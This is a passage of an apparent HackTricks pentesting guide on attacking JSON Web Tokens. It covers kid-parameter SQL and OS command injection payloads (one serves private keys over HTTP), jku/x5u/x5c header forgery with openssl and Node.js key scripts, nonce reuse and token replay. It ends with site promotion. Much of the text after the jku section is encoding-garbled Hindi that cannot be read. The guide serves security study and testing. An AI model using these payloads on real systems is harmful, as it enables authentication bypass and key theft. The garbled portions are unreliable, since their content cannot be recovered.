By targeting files with predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password for JWT generation.

#### SQL Injection via "kid"

If the `kid` claim's content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the `kid` payload. An example payload that uses SQL injection to alter the JWT signing process includes:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

This alteration forces the use of a known secret key, `ATTACKER`, for JWT signing.

#### OS Injection through "kid"

A scenario where the `kid` parameter specifies a file path used within a command execution context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the `kid` parameter, it's possible to expose private keys. An example payload for achieving RCE and key exposure is:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\
If the token uses a тАЬ**jku**тАЭ **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

First you need to create a new certificate with new private & public keys
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
рддреЛ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**jwt.io**](https://jwt.io) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдирдП JWT рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рд░реНрдорд┐рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреЗ рд╕рд╛рде рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ jku рдХреЛ рдмрдирд╛рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрд░ рдкреНрд╡рд╛рдЗрдВрдЯ рдХрд░рдХреЗред** рдПрдХ рд╡реИрдз jku рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдореВрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк "e" рдФрд░ "n" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. рдПрдХ URI рдЬреЛ X.509 (рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рд░реВрдк рдорд╛рдирдХ) рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рд╕реЗрдЯ рдХреЛ PEM рд░реВрдк рдореЗрдВ рдПрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИред рд╕реЗрдЯ рдореЗрдВ рдкрд╣рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡рд╣ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕ JWT рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЖрдЧрд╛рдореА рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдкрд┐рдЫрд▓реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдкреВрд░реА рд╣реЛ рдЬрд╛рддреА рд╣реИред X.509 рдХреЛ RFC 52807 рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рд╡рд╣рди рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЗрд╕ рд╣реЗрдбрд░ рдХреЛ **рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ URL рдореЗрдВ рдмрджрд▓рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **JWT рдХреЛ рдмрд┐рдЧрд╛рдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдЯреЛрдХрди рдЬрд╛рд▓ рд╕рдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓рдиреА рд╣реЛрдЧреА:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **created public and private keys and pointing the parameter x5u to the certificate .crt created.**

![](<../.gitbook/assets/image (953).png>)

You can also abuse both of these vulns **for SSRFs**.

#### x5c

This parameter may contain the **certificate in base64**:

![](<../.gitbook/assets/image (1116).png>)

If the attacker **generates a self-signed certificate** and creates a forged token using the corresponding private key and replace the "x5c" parameterтАЩs value with the newly generatedcertificate and modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### рдПрдореНрдмреЗрдбреЗрдб рдкрдмреНрд▓рд┐рдХ рдХреА (CVE-2018-0114)

рдпрджрд┐ JWT рдореЗрдВ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдПрдореНрдмреЗрдбреЗрдб рд╣реИ рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ:

![](<../.gitbook/assets/image (619).png>)

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд nodejs рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдбреЗрдЯрд╛ рд╕реЗ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="тАЛANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"тАЛ;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
рдПрдХ рдирдП рдирд┐рдЬреА/рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдирдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рдЯреЛрдХрди рдХреЗ рдЕрдВрджрд░ рд╕рдорд╛рд╣рд┐рдд рдХрд░рдирд╛ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдирдпрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
рдЖрдк рдЗрд╕ Node.js рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "n" рдФрд░ "e" рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### ES256: рдПрдХ рд╣реА рдиреЙрдиреНрд╕ рдХреЗ рд╕рд╛рде рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдкреНрд░рдХрдЯреАрдХрд░рдг

рдпрджрд┐ рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди ES256 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ рдФрд░ рджреЛ JWT рдЬрдирд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА рдиреЙрдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ, рддреЛ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ: [ECDSA: рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдкреНрд░рдХрдЯреАрдХрд░рдг, рдпрджрд┐ рдПрдХ рд╣реА рдиреЙрдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (SECP256k1 рдХреЗ рд╕рд╛рде)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

JTI (JWT ID) рдХреНрд▓реЗрдо рдПрдХ JWT рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЯреЛрдХрди рдХреЛ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╕реНрдерд┐рддрд┐ рдХреА рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рдЖрдИрдбреА рдХреА рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ 4 рд╣реИ (0001-9999)ред рдЕрдиреБрд░реЛрдз 0001 рдФрд░ 10001 рдПрдХ рд╣реА рдЖрдИрдбреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдмреИрдХрдПрдВрдб рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрд░реЛрдз рдкрд░ рдЖрдИрдбреА рдХреЛ рдмрдврд╝рд╛ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдПрдХ рдЕрдиреБрд░реЛрдз рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП** (рдкреНрд░рддреНрдпреЗрдХ рд╕рдлрд▓ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмреАрдЪ 10000 рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)ред

### JWT рдкрдВрдЬреАрдХреГрдд рджрд╛рд╡реЗ

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### рдЕрдиреНрдп рд╣рдорд▓реЗ

**рдХреНрд░реЙрд╕-рд╕рд░реНрд╡рд┐рд╕ рд░рд┐рд▓реЗ рдЕрдЯреИрдХ**

рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреБрдЫ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдкрдиреЗ рдЯреЛрдХрди рдХрд╛ рдЙрддреНрдкрд╛рджрди рдФрд░ рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп JWT рд╕реЗрд╡рд╛ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИрдВред рдЙрди рдШрдЯрдирд╛рдУрдВ рдХреЛ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдПрдХ рдЯреЛрдХрди, рдЬреЛ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рд▓рд┐рдП JWT рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЙрд╕реА JWT рд╕реЗрд╡рд╛ рдХреЗ рджреВрд╕рд░реЗ рдЧреНрд░рд╛рд╣рдХ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрджрд┐ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреА рд╕реЗрд╡рд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ JWT рдХрд╛ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдпрд╛ рдирд╡реАрдХрд░рдг рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдЦрд╛рддреЗ рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо/рдИрдореЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдлрд┐рд░ рдЙрд╕ рдЯрд╛рд░рдЧреЗрдЯ рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдЯреЛрдХрди рдХреЛ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

* рдЖрдкрдХреЗ рдЯреЛрдХрди рдХреЛ рд╕реНрд╡реАрдХреГрддрд┐ рдорд┐рд▓рдиреЗ рдкрд░ рдПрдХ рдЧрдВрднреАрд░ рдореБрджреНрджрд╛ рд╕рдВрдХреЗрддрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд╛рддреЗ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдкрд░реАрдХреНрд╖рдг рдХреА рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХрд╛рдиреВрдиреА рдЧреНрд░реЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рдЯреЛрдХрди рдХреА рд╕рдордп рд╕реАрдорд╛ рдХреА рдЬрд╛рдВрдЪ**

рдЯреЛрдХрди рдХреА рд╕рдордп рд╕реАрдорд╛ "exp" рдкреЗрдпрд▓реЛрдб рджрд╛рд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪреА рдЬрд╛рддреА рд╣реИред рдЬрдмрдХрд┐ JWTs рдЕрдХреНрд╕рд░ рд╕рддреНрд░ рд╕реВрдЪрдирд╛ рдХреЗ рдмрд┐рдирд╛ рдкреНрд░рдпреБрдХреНрдд рд╣реЛрддреЗ рд╣реИрдВ, рд╕рд╛рд╡рдзрд╛рди рд╡реНрдпрд╡рд╕реНрдерд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЕрдХреНрд╕рд░, рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ JWT рдХреЛ рдкрдХрдбрд╝рдХрд░ рдФрд░ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╕реЗ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред JWT RFC рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдордп рд╕реАрдорд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП "exp" рджрд╛рд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ JWT рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХреЗ рд╣рдорд▓реЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЗрд╕ рдореВрд▓реНрдп рдХреА рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдФрд░ рд╕рдордп рд╕реАрдорд╛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЧрдП рдЯреЛрдХрди рдХреА рдЕрд╕реНрд╡реАрдХреГрддрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдЪрд┐рдд рдЬрд╛рдВрдЪреЛрдВ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдпрджрд┐ рдЯреЛрдХрди рдореЗрдВ "exp" рджрд╛рд╡рд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдкрд░реАрдХреНрд╖рдг рд╕рдордп рд╕реАрдорд╛рдПрдВ рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ, рддреЛ рдЯреЛрдХрди рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдирд╛ рдФрд░ рд╕рдордп рд╕реАрдорд╛ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЗрд╕реЗ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред рдЯреЛрдХрди рдХреА рд╕рд╛рдордЧреНрд░реА, рд╕рдордп рдЪрд┐рд╣реНрдирд╛рдВрдХрди рдФрд░ рд╕рдорд╛рдкреНрддрд┐ рдХреА рдЬрд╛рдВрдЪ (рд╕рдордп рдЪрд┐рд╣реНрдирд╛рдВрдХрди UTC рдореЗрдВ) рдХреЛ jwt_tool рдХреЗ -R рдзреНрд╡рдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдм рднреА рдЯреЛрдХрди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЯреЛрдХрди рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ред

### рдЙрдкрдХрд░рдг

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рдирд┐рдпреБрдХреНрддрд┐ рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдмреЛрд▓реА рдЬрд░реБрд░реА рд╣реИ_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ **рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
